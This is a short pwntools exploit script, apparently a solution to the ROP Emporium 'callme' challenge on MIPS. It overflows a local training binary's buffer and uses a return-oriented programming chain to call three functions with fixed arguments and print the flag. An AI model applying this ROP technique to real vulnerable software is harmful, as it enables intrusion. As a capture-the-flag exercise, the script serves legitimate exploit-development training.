from pwn import *

elf = ELF("callme_mipsel")

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.INFO

gdbscript = '''
set follow-fork-mode parent
break *pwnme+0xcc
continue
'''

def connection():
    if args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = process([elf.path])
    return c

BUFFER_SIZE = 32
READ_SIZE = 512

def make_payload(address):
    rop = ROP(elf)
    rop.raw(rop.generatePadding(0, BUFFER_SIZE + context.bytes))
    rop.raw([elf.symbols.usefulGadgets, 0, address, (0xdeadbeef, 0xcafebabe, 0xd00df00d)[::-1], elf.symbols.main])
    payload = rop.chain()
    assert len(payload) <= READ_SIZE
    return payload

def main():
    c = connection()
    [c.sendafter(b'> ', make_payload(a)) for a in [elf.plt.callme_one, elf.plt.callme_two, elf.plt.callme_three]]
    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())

if __name__ == '__main__':
    main()
